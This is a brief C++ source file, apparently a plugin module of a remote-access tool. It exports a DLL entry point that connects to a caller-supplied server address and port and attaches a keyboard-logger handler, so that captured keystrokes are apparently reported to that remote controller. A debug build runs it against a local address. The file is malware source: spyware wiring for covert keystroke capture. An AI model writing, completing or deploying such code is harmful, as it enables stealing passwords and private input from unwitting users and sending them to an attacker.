#include "IOCPClient.h"
#include "Manager.h"
#include "KeybdLogger.h"

extern "C" __declspec(dllexport) void  ModuleEntry(char* szServerAddr,
	unsigned short uPort, DWORD dwParam = 0){

	CManager *pManager = new CManager();

	CIOCPClient *pClient = new CIOCPClient(pManager,
		szServerAddr, uPort);

	CMsgHandler *pHandler = new CKeybdLogger(pManager);

	pManager->Associate(pClient, pHandler);
	pClient->Run();

	delete pHandler;
	delete pClient;
	delete pManager;
}


#ifdef _DEBUG
int main(){
	CIOCPClient::SocketInit();
	ModuleEntry("127.0.0.1", 10086);
	CIOCPClient::SocketTerm();
}
#endif